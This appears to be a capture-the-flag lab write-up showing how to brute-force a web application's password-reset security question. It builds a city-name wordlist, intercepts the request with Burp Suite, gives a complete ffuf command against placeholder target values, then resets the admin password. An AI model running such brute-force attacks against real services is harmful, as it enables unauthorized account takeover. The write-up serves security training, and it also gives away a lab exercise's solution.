# Vulnerable Password Reset

### Which city is the admin user from?

This assessment has a web application with a password reset function that has a security question. In order to try to get the password, we'll try to use a wordlist containing city names.

**Step 1** - Get the wordlist:

* Download the full [CSV wordlist](https://github.com/datasets/world-cities/blob/main/data/world-cities.csv)
* Reduce the wordlist to contain only city names
  *   ```bash
      cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
      ```



**Step 2** - Intercept the Security Question POST Request:

* Use Burp Suite to intercept the Request

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Brute-force the Security Question:

* With the POST Request information build the following ffuf command:
  *   {% code overflow="wrap" %}
      ```bash
      ffuf -w ./city_wordlist.txt -u http://SERVER_IP:SERVER_PORT/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=PHP_SESSION_ID" -d "security_response=FUZZ" -fr "Incorrect response."

      ```
      {% endcode %}



<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Reset the admin user's password on the target system to obtain the flag.

**Step 1** - Use the city discovered to answer the first question to reset the admin's password

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Change the password

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Login with the new credentials to get the flag!

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
